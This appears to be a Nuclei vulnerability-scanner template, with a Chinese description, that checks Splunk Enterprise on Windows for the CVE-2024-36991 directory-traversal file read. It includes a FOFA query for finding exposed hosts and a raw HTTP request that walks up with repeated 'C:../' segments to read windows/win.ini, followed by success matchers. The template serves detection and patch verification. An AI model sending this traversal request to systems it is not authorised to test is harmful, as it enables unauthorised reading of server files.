
id: Splunk-messaging-flieread-CVE-2024-36991

info:
  name: Splunk Enterprise for Windows 任意文件读取漏洞
  author: god
  severity: high
  description: |
    Splunk Enterprise 是一款强大的数据分析软件，它允许用户从各种来源收集、索引和搜索机器生成的数据。2024年7月，官方发布安全通告，披露 CVE-2024-36991 Splunk Enterprise Windows平台 modules/messaging 目录遍历漏洞。漏洞仅影响 Windows平台上的 Splunk Enterprise，官方已发布安全更新，建议升级至最新版本。1
  metadata:
    fofa-query: app="splunk-Enterprise"
  tags: cve,fileread,splunk-Enterpris

http:
- raw:
  - |+
    @timeout: 30s
    GET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../windows/win.ini HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
    Connection: close
    Accept-Encoding: gzip


  max-redirects: 3
  matchers-condition: and
  matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(body, 'fonts')"
        condition: and
